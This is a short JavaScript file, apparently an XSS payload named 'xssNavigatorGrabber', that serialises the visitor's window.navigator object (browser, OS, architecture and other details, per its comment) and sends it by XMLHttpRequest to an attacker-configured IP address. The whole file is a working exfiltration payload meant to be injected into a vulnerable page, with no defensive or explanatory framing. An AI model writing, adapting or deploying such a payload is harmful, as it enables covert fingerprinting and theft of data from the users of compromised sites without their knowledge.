/**
 *  xssNavigatorGrabber
 * 
 *  A function that retrieves window.navigator object and sends it  to the provided URL.
 *  window.navigator inclused some interesting things including the browser, OS, 
 *  architecture, geolocation and other interesting things.
 * 
 */

/**
 * update this as needed
 */
const ipAddress = '127.0.0.1';

// construct the target url
const url = `http://${ipAddress}/navigator=`;

// Serialise the navigator object
var _navigator = {};
for (var i in navigator) _navigator[i] = navigator[i];

// Construct and send the request
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", url + JSON.stringify(_navigator), true);
xmlHttp.send();
